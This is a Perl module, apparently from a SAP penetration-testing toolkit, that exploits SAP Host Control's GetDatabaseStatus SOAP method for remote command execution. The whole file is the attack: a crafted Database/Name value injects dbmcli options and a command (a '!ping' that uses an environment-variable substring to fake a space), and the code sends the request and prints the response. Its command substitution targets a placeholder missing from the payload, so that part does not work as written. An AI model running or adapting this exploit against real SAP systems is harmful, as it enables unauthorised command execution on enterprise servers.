#!/usr/bin/perl
# Module Command execution (SAPHOSTCTRL)

# CONFIG
######################
my $desc ="Command execution (SAPHOSTCTRL_MMC) \n\t Usage: black.pl .. .. $argv[5] <command>\n\t <command> - command to execute, default is WHOAMI\n"; 
our $funcName="saphostctrl_dbmcli_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub saphostctrl_dbmcli_Func()
{

	my $XML='
<?xml version="1.0" encoding="UTF-8" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header><sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/"><enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body>
<ns1:GetDatabaseStatus xmlns:ns1="urn:SAPHostControl">
<aArguments>
<item>
<mKey>Database/Type</mKey>
<mValue>ada</mValue>
</item>
<item>
<mKey>Database/Password</mKey>
<mValue>test</mValue>
</item>
<item>
<mKey>Database/Username</mKey>
<mValue>admin</mValue>
</item>
<item>
<mKey>Database/Name</mKey>
<mValue>NSP -o c:\windows\temp\test1.txt -n hosttest
!ping%programfiles:~10,1%172.16.0.130</mValue>
</item></aArguments>
</ns1:GetDatabaseStatus>
</SOAP-ENV:Body></SOAP-ENV:Envelope>';
	
	if ($ARGV[$m_arg_i+1]){
		$cmd=$ARGV[$m_arg_i+1];
		print $cmd." - cmd \n\n";
	} else {
		$cmd='whoami';
	}
	
	$XML=~s/%COMMAND_NAME%/$cmd/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1,"/");

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}